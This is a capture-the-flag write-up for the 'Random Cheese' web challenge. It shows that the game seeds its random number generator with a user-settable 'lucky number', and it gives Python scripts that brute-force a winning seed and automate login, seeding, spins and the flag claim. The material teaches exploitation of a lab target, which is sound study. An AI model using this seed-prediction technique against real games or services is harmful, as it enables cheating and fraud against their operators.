# Random Cheese CTF Writeup

## Challenge Description
Jerry's finally opened his dream cheese shop, and Tom is furious! Every customer gets a lucky draw — spin the wheel 10 times and score 85+ to win the grand meal. But Tom rigged the system to make sure nobody ever gets THAT lucky... or did he?

Challenge: https://web-random-cheese.tracebash.xyz/

## Initial Reconnaissance & PRNG Analysis
Upon accessing the challenge website, we are presented with a login/register page. After registering and logging in with any user, we land on a dashboard with a "Spin Wheel!" button. The goal is to achieve a total score of 85 or more within 10 spins.

Initial tests by spinning the wheel multiple times revealed a crucial behavior:
1. For any given user, spinning the wheel 10 times (a full game) always yielded the exact same sequence of numbers. For instance, 'bypass_user' consistently got `[6, 1, 8, 9, 10, 8, 9, 3, 1, 4]` (total 59), and 'attack_user' got `[10, 6, 4, 7, 3, 7, 7, 5, 5, 7]` (total 61).
2. Resetting the game using the `/reset` endpoint did *not* change this sequence for the current user. It only reset the `spins_count` and `current_score` on the server-side, but the underlying pseudo-random number generator (PRNG) state remained tied to the user, effectively restarting the *same* sequence from the beginning.
3. This implies that the PRNG is seeded based on something unique to the user's session/account, and this seed is re-applied or implicitly managed to produce the same sequence every game. With the observed sequences, it was impossible to reach the target score of 85. This matches the challenge description: "Tom rigged the system to make sure nobody ever gets THAT lucky..."

## Discovering the "Lucky Number"
The phrase "...or did he?" hinted at a loophole. We explored other endpoints accessible post-login and found `/settings`. This page revealed a "Current Lucky Number: 242" and an option to "Set New Lucky Number (1-1000)". This was the critical clue! The "Lucky Number" is almost certainly the seed for the PRNG.

The server is likely using Python's `random.seed(lucky_number)` to initialize its PRNG. Since we can control the `lucky_number`, we can control the sequence of random numbers generated.

## Exploitation: Finding the Winning Seed
The strategy is to find a `lucky_number` (between 1 and 1000) that, when used as a seed, generates a sequence of 10 spins summing to 85 or more. We can do this by bruteforcing locally:

```python
import random

def test_lucky_number(lucky_number):
    random.seed(lucky_number)
    spins = []
    for _ in range(10):
        # The game generates numbers from 1 to 10 (inclusive)
        spins.append(random.randrange(1, 11)) 
    return spins, sum(spins)

if __name__ == "__main__":
    for lucky_num in range(1, 1001): # Iterate from 1 to 1000
        spins, total_score = test_lucky_number(lucky_num)
        if total_score >= 85:
            print(f"Found winning lucky number! {lucky_num} -> Sequence: {spins}, Total: {total_score}")
            # Found the first one, no need to check further
            break 
```

Running this script yielded the following:
`Found winning lucky number! 854 -> Sequence: [6, 6, 9, 9, 10, 8, 10, 9, 10, 10], Total: 87`

So, `lucky_number = 854` is our winning seed, giving a total score of 87, which is above the 85-point threshold.

## Claiming the Flag
With the winning `lucky_number` identified, the final steps are:
1.  Log in as a user (e.g., `bypass_user`).
2.  Update the `lucky_number` for this user to `854` via the `/update_lucky` endpoint. This action automatically resets the game progress on the server.
3.  Perform 10 spins. These spins will now follow the predictable sequence generated by seed `854`.
4.  Once 10 spins are completed and the score is 87, the "Claim Flag" button becomes active. Sending a POST request to `/claim` will retrieve the flag.

We used a Python script (`exploit_final_flag.py`) to automate these steps:

```python
import requests
import json
import time
import re

BASE_URL = "https://web-random-cheese.tracebash.xyz"

def register_and_login(username, password):
    session = requests.Session()
    register_url = f"{BASE_URL}/register"
    session.post(register_url, data={"username": username, "password": password})
    login_url = f"{BASE_URL}/login"
    response = session.post(login_url, data={"username": username, "password": password})
    if response.url == f"{BASE_URL}/" or response.url == f"{BASE_URL}/#":
        return session
    else:
        print(f"Login failed for {username}. Unexpected response or redirect.")
        return None

def spin_wheel(session):
    spin_url = f"{BASE_URL}/spin"
    try:
        response = session.post(spin_url, json={})
        response.raise_for_status()
        data = response.json()
        return data
    except requests.exceptions.RequestException as e:
        print(f"Spin failed: {e}")
        return None

def claim_flag(session):
    claim_url = f"{BASE_URL}/claim"
    try:
        response = session.post(claim_url)
        response.raise_for_status()
        print("Claim attempt response:")
        print(response.text)
        flag_match = re.search(r'FLAG: (GPNCTF\{[a-zA-Z0-9_]+\})', response.text)
        if flag_match:
            print(f"<FLAG>{flag_match.group(1)}</FLAG>")
            return True
        return False
    except requests.exceptions.RequestException as e:
        print(f"Claim failed: {e}")
        return False

if __name__ == "__main__":
    username = "winning_user" # Or any user
    password = "winning_password"
    
    print(f"Logging in {username}...")
    session = register_and_login(username, password)
    if not session:
        exit(1)
        
    winning_lucky_number = 854
    optimal_sequence = [6, 6, 9, 9, 10, 8, 10, 9, 10, 10]

    print(f"\nUpdating lucky number to {winning_lucky_number}...")
    update_url = f"{BASE_URL}/update_lucky"
    session.post(update_url, data={"lucky_number": winning_lucky_number})
    time.sleep(1) # Allow server to process the update and reset

    print("\nStarting the game with the optimal lucky number...")
    current_score = 0
    spins_done = 0
    for i, expected_val in enumerate(optimal_sequence):
        spin_data = spin_wheel(session)
        if spin_data:
            actual_val = spin_data.get("val")
            current_score = spin_data.get("score")
            spins_done = spin_data.get("spins")
            print(f"Spin {spins_done}: Expected {expected_val}, Got {actual_val}, Current Score: {current_score}")
            if actual_val != expected_val:
                print("Mismatch in spin sequence! Prediction failed.")
                exit(1)
        else:
            print("Failed to get spin data during optimal execution.")
            exit(1)
        time.sleep(0.1)

    print(f"\nFinal score: {current_score}, Spins: {spins_done}")
    if spins_done == 10 and current_score >= 85:
        print("Target score reached! Attempting to claim flag...")
        claim_flag(session)
    else:
        print("Target score not reached or spins incorrect. Something went wrong.")
```
